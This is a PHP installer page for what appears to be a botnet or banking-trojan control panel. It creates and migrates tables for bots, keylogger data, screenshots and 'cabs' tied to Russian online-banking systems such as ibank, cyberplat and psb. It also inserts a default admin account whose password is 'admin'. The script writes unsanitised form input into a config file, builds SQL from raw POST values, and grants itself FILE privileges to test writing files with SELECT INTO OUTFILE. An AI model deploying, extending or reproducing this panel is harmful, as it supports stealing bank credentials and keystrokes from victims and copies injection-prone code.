"<?php echo $lang['nm']; ?>"
<br /><br />
<?php
if($_GET['go'] != 'index') exit;
//error_reporting(-1);
$INSTALL = false;
$ERROR = false;

if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db'])){	$cfg_text = '';
	$cfg_text .= '$cfg_db[\'host\'] = \''.$_POST['host'].'\';' . "\n";
	$cfg_text .= '$cfg_db[\'user\'] = \''.$_POST['user'].'\';' . "\n";
	$cfg_text .= '$cfg_db[\'pass\'] = \''.$_POST['pass'].'\';' . "\n";
	$cfg_text .= '$cfg_db[\'db\'] = \''.$_POST['db'].'\';' . "\n";
	//@file_put_contents('includes/config.php', $cfg_text);
	ioncube_write_file('includes/config.cfg', $cfg_text);
}

include_once('includes/functions.get_config.php');

$cfg_db = get_config();
require_once("classes/mysqli.class.php");
$mysqli = new mysqli_db();

if(!empty($_POST['host'])) $cfg_db['host'] = $_POST['host'];
if(!empty($_POST['user'])) $cfg_db['user'] = $_POST['user'];
if(!empty($_POST['pass'])) $cfg_db['pass'] = $_POST['pass'];
if(!empty($_POST['db'])) $cfg_db['db'] = $_POST['db'];

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
if(count($mysqli->errors) > 0){	$INSTALL = true;
}else{	if($_GET['file_save'] != 'no'){
		$mysqli->db[0]->query('GRANT FILE ON * . * TO \''.$_POST['user'].'\'@\''.$_POST['host'].'\'');

		$cte = 'QWERYTEST!';
		$result = $mysqli->query('SELECT concat(urldecode(\''.urlencode($cte).'\')) cte');

		if($result->cte != $cte){			include_once('includes/functions.mysql_urldecode.php');

			$mysqli->db[0]->query('DROP FUNCTION IF EXISTS urldecode;');
			$mysqli->db[0]->query(mysql_urldecode());

			$result = $mysqli->query('SELECT concat(urldecode(\''.urlencode($cte).'\')) cte');

			if($result->cte != $cte){				$INSTALL = true;
				$ERROR = 2;
			}

		}

		if($ERROR != 2 && $INSTALL != true){			$test_str = md5(time());
			$file_name = str_replace('\\', '/', '/tmp/' . $test_str);
			$mysqli->db[0]->query('SELECT concat(urldecode(\''.$test_str.'\')) INTO OUTFILE \''.$file_name.'\' FIELDS TERMINATED BY \';\' LINES TERMINATED BY \'\'');

			if(file_exists($file_name)){				if(file_get_contents($file_name) != $test_str . ';'){					$INSTALL = true;
					$ERROR = 1;
				}
				@unlink($file_name);
			}else{
				$INSTALL = true;
				$ERROR = 1;
			}
		}
	}

	if($INSTALL != true){		/*
		$tb = array();
		$tables = $mysqli->query('SHOW TABLES', null, null, false);
		if(count($tables > 0)){			foreach($tables as $t){				$t = get_object_vars($t);
				$t = array_shift($t);
                if(preg_match('~_bak$~is', $t) != true){                	$mysqli->query('DROP TABLE IF EXISTS '.$t.'_bak');
                	$mysqli->query('RENAME TABLE '.$t.' TO '.$t.'_bak');
                	$tb[$t] = $t;
				}
			}
		}
        unset($tables);
        */

		if(current($mysqli->query('SHOW TABLES LIKE \'bf_bots\'')) == 'bf_bots'){
			$mysqli->query('DROP TABLE IF EXISTS bf_bots_bak');
			$mysqli->query('RENAME TABLE bf_bots TO bf_bots_bak');
		}

		if(current($mysqli->query('SHOW TABLES LIKE \'bf_bots_ip\'')) == 'bf_bots_ip'){
			$mysqli->query('DROP TABLE IF EXISTS bf_bots_ip_bak');
			$mysqli->query('RENAME TABLE bf_bots_ip TO bf_bots_ip_bak');
		}

		if(current($mysqli->query('SHOW TABLES LIKE \'bf_filters_files\'')) == 'bf_filters_files'){
			$mysqli->query('DROP TABLE IF EXISTS bf_filters_files_bak');
			$mysqli->query('RENAME TABLE bf_filters_files TO bf_filters_files_bak');
		}

		if(current($mysqli->query('SHOW TABLES LIKE \'bf_filters\'')) == 'bf_filters'){
			$mysqli->query('DROP TABLE IF EXISTS bf_filters_bak');
			$mysqli->query('RENAME TABLE bf_filters TO bf_filters_bak');
		}

		if(current($mysqli->query('SHOW TABLES LIKE \'bf_cabs\'')) == 'bf_cabs'){
			$mysqli->query('DROP TABLE IF EXISTS bf_cabs_bak');
			$mysqli->query('RENAME TABLE bf_cabs TO bf_cabs_bak');
		}

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_cabs_parts\'')) == 'bf_cabs_parts'){
        	$mysqli->query('DROP TABLE IF EXISTS bf_cabs_parts_bak');
        	$mysqli->query('RENAME TABLE bf_cabs_parts TO bf_cabs_parts_bak');
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_comments\'')) == 'bf_comments'){
        	$mysqli->query('DROP TABLE IF EXISTS bf_comments_bak');
        	$mysqli->query('RENAME TABLE bf_comments TO bf_comments_bak');
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_keylog\'')) == 'bf_keylog'){
        	$mysqli->query('DROP TABLE IF EXISTS bf_keylog_bak');
        	$mysqli->query('RENAME TABLE bf_keylog TO bf_keylog_bak');
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_keylog_data\'')) == 'bf_keylog_data'){
        	$mysqli->query('DROP TABLE IF EXISTS bf_keylog_data_bak');
        	$mysqli->query('RENAME TABLE bf_keylog_data TO bf_keylog_data_bak');
        }

		$ERROR = 0;
		if(file_exists('scripts/install/install.sql')){
			$sql = file_get_contents('scripts/install/install.sql');
		}elseif(file_exists('scripts/install/install.sql.tpl')){
			$sql = ioncube_read_file(realpath('scripts/install/install.sql.tpl'));
		}

		$sql .= "\n\r";
		include_once('modules/accounts/rights_list.php');
		foreach($right as $key => $value){
			foreach($value as $key2 => $value2){
				$right[$key][$key2] = 'on';
			}
		}

		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(1, \''.$lang['ss'].'\', \'\', NULL, 0, \'0\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(2, \''.$lang['es'].'\', \'\', NULL, 0, \'0\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(3, \''.$lang['pls'].'\', \'\', NULL, 0, \'0\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(4, \''.$lang['trs'].'\', \'\', NULL, 0, \'0\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(5, \''.$lang['fs'].'\', \'\', NULL, 0, \'0\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(6, \''.$lang['drsa'].'\', \'\', NULL, 0, \'0\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(7, \''.$lang['drsi'].'\', \'\', NULL, 0, \'0\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(8, \''.$lang['mej'].'\', \'\', NULL, 0, \'1|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(9, \''.$lang['mej'].'\', \'\', NULL, 0, \'2|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(10, \''.$lang['mej'].'\', \'\', NULL, 0, \'3|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(11, \''.$lang['mej'].'\', \'\', NULL, 0, \'4|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(12, \''.$lang['mej'].'\', \'\', NULL, 0, \'5|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(13, \''.$lang['mej'].'\', \'\', NULL, 0, \'6|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(14, \''.$lang['mej'].'\', \'\', NULL, 0, \'7|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(15, \''.$lang['sng'].'\', \'\', NULL, 0, \'1|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(16, \''.$lang['sng'].'\', \'\', NULL, 0, \'2|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(17, \''.$lang['sng'].'\', \'\', NULL, 0, \'3|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(18, \''.$lang['sng'].'\', \'\', NULL, 0, \'4|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(19, \''.$lang['sng'].'\', \'\', NULL, 0, \'5|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(20, \''.$lang['sng'].'\', \'\', NULL, 0, \'6|\');' . "\r\n";
		$sql .= 'INSERT INTO bf_filters (id, name, fields, host, save_log, parent_id) VALUES(21, \''.$lang['sng'].'\', \'\', NULL, 0, \'7|\');' . "\r\n";

		$config = array();
		$config['prefix'] = '';
		$config['cp'] = array();
		$config['cp']['bots'] = '100';
		$config['cp']['bots_country'] = '100';
		$config['cp']['keylog'] = '100';
		$config['cp']['keylogp'] = '100';
		$config['cp']['cabs'] = '100';
		$config['cp']['filters'] = '100';
		$config['jabber'] = '';
		$config['sbbc'] = '0';
		$config['klimit'] = '';
		$config['hunter_limit'] = '0';
        $sql .= "\n\r";
		$sql .= 'INSERT INTO bf_users (login, password, config, access, enable) VALUES (\'admin\', \''.MD5('admin').'\', \''.json_encode($config).'\', \''.json_encode($right).'\', \'1\');';

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_bots_bak\'')) == 'bf_bots_bak'){
        	$sql .= "\n\r";
        	$sql .= "DROP TABLE IF EXISTS bf_bots;";
        	$sql .= "\n\r";
        	$sql .= "RENAME TABLE bf_bots_bak TO bf_bots;";
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_bots_ip_bak\'')) == 'bf_bots_ip_bak'){
        	$sql .= "\n\r";
        	$sql .= "DROP TABLE IF EXISTS bf_bots_ip;";
        	$sql .= "\n\r";
        	$sql .= "RENAME TABLE bf_bots_ip_bak TO bf_bots_ip;";
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_filters_unnecessary_bak\'')) == 'bf_filters_unnecessary_bak'){
        	$sql .= "\n\r";
        	$sql .= "DROP TABLE IF EXISTS bf_filters_unnecessary;";
        	$sql .= "\n\r";
        	$sql .= "RENAME TABLE bf_filters_unnecessary_bak TO bf_filters_unnecessary;";
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_filters_files_bak\'')) == 'bf_filters_files_bak'){
        	$sql .= "\n\r";
        	$sql .= "DROP TABLE IF EXISTS bf_filters_files;";
        	$sql .= "\n\r";
        	$sql .= "RENAME TABLE bf_filters_files_bak TO bf_filters_files;";
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_filters_save_bak\'')) == 'bf_filters_save_bak'){
        	$sql .= "\n\r";
        	$sql .= "DROP TABLE IF EXISTS bf_filters_save;";
        	$sql .= "\n\r";
        	$sql .= "RENAME TABLE bf_filters_save_bak TO bf_filters_save;";
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_filters_bak\'')) == 'bf_filters_bak'){
        	$sql .= "\n\r";
        	$sql .= "DROP TABLE IF EXISTS bf_filters;";
        	$sql .= "\n\r";
        	$sql .= "RENAME TABLE bf_filters_bak TO bf_filters;";
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_cabs_bak\'')) == 'bf_cabs_bak'){
        	$sql .= "\n\r";
        	$sql .= "DROP TABLE IF EXISTS bf_cabs;";
        	$sql .= "\n\r";
        	$sql .= "RENAME TABLE bf_cabs_bak TO bf_cabs;";
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_cabs_parts_bak\'')) == 'bf_cabs_parts_bak'){
        	$sql .= "\n\r";
        	$sql .= "DROP TABLE IF EXISTS bf_cabs_parts;";
        	$sql .= "\n\r";
        	$sql .= "RENAME TABLE bf_cabs_parts_bak TO bf_cabs_parts;";
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_comments_bak\'')) == 'bf_comments_bak'){
        	$sql .= "\n\r";
        	$sql .= "DROP TABLE IF EXISTS bf_comments;";
        	$sql .= "\n\r";
        	$sql .= "RENAME TABLE bf_comments_bak TO bf_comments;";
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_keylog_bak\'')) == 'bf_keylog_bak'){
        	$sql .= "\n\r";
        	$sql .= "DROP TABLE IF EXISTS bf_keylog;";
        	$sql .= "\n\r";
        	$sql .= "RENAME TABLE bf_keylog_bak TO bf_keylog;";
        }

        if(current($mysqli->query('SHOW TABLES LIKE \'bf_keylog_data_bak\'')) == 'bf_keylog_data_bak'){
        	$sql .= "\n\r";
        	$sql .= "DROP TABLE IF EXISTS bf_keylog_data;";
        	$sql .= "\n\r";
        	$sql .= "RENAME TABLE bf_keylog_data_bak TO bf_keylog_data;";
        }

        $sql .= "\n\r";

        //$sql .= 'ALTER TABLE `bf_cabs` CHANGE `type` `type` VARCHAR( 32 ) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;';
        //$sql .= 'ALTER TABLE `bf_comments` CHANGE `type` `type` VARCHAR( 32 ) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;';
        //$sql .= 'ALTER TABLE `bf_cabs` ADD INDEX `type` ( `type` );';
        //$sql .= 'ALTER TABLE `bf_comments` ADD INDEX `type` ( `type` );';

        //$sql .= "\n\r";

        $sql .= 'update bf_cabs set type = \'bss\' WHERE (type = \'1\');';
        $sql .= 'update bf_cabs set type = \'ibank\' WHERE (type = \'2\');';
        $sql .= 'update bf_cabs set type = \'inist\' WHERE (type = \'3\');';
        $sql .= 'update bf_cabs set type = \'cyberplat\' WHERE (type = \'4\');';
        $sql .= 'update bf_cabs set type = \'kp\' WHERE (type = \'5\');';
        $sql .= 'update bf_cabs set type = \'psb\' WHERE (type = \'6\');';

        //$sql .= "\n\r";

        //$sql .= 'ALTER TABLE `bf_keylog_data` ADD `trash` ENUM( \'0\', \'1\' ) NOT NULL DEFAULT \'0\' AFTER `data` ;';

        $sql .= "\n\r";

        $sql .= 'OPTIMIZE TABLE `bf_bots`, `bf_bots_ip`, `bf_cabs`, `bf_cabs_parts`, `bf_cmds`, `bf_comments`, `bf_country`, `bf_filters`, `bf_filters_files`, `bf_filters_save`, `bf_filters_unnecessary`, `bf_filter_22`, `bf_filter_ep`, `bf_filter_ft`, `bf_filter_me`, `bf_filter_rd`, `bf_keylog`, `bf_keylog_data`, `bf_links`, `bf_plugins`, `bf_plugin_history`, `bf_process`, `bf_process_stats`, `bf_screens`, `bf_search_result`, `bf_search_task`, `bf_users`;';

        $sql .= "\n\r";
        //echo $sql;
		//$sql = preg_replace('~EXISTS bf_(.*);~i', 'EXISTS bf_$1_new;', $sql);
		//$sql = preg_replace('~(TABLE|INTO) bf_(.*) ~iU', '$1 bf_$2_new ', $sql);

		if($mysqli->db[0]->multi_query($sql) != true) $INSTALL = true;

        //$mysqli->disconnect();
        /*
	    echo '<pre>';
		print_r($sql);
		echo '</pre>';
	    */

    }
}
?>

<br />
<?php
if($INSTALL != true){	if($_GET['step'] == 3){		$_SESSION['step'] = 3;
	}
?>
<?php echo $lang['myi']; ?>
<hr />
<input type="button" value="<?php echo $lang['next']; ?>" onclick="location = '/install/index.html?step=4';" />
<?php
}else{
?>
<?php echo $lang['pn']; ?>
<br /><br />
<?php

if($ERROR == 1){	print('"<span style="color:red">'.$lang['pnr'].'</span>"!');
}elseif($ERROR == 2){	print('<textarea cols="80" rows="10">'.mysql_urldecode().'</textarea><br /><br />');
	print('"<span style="color:red">'.$lang['nsp'].'</span>"!');
}else{
	print('"<span style="color:red">'.$lang['npm'].'</span>"!');
}

?>
<hr />
<div align="right" style="width: 450px">
<form method="post" enctype="application/x-www-form-urlencoded">
<?php echo $lang['ads']; ?>:&nbsp;<input type="text" name="host" value="<?php echo $cfg_db['host']; ?>" style="width: 300px">
<br /><br />
<?php echo $lang['pol']; ?>:&nbsp;<input type="text" name="user" value="<?php echo $cfg_db['user']; ?>" style="width: 300px">
<br /><br />
<?php echo $lang['pas']; ?>:&nbsp;<input type="text" name="pass" value="<?php echo $cfg_db['pass']; ?>" style="width: 300px">
<br /><br />
<?php echo $lang['bad']; ?>:&nbsp;<input type="text" name="db" value="<?php echo $cfg_db['db']; ?>" style="width: 300px">
<br /><br />
<?php
if($ERROR == 1){?>
<input type="button" value="<?php echo $lang['skip']; ?>" onclick="if(confirm('<?php echo $lang['skip']; ?> ?')){location = '/install/index.html?step=3&file_save=no';}" />
<?php
}
?>
<input type="submit" style="width: 310px" />
</form>
</div>
<?php
}
?>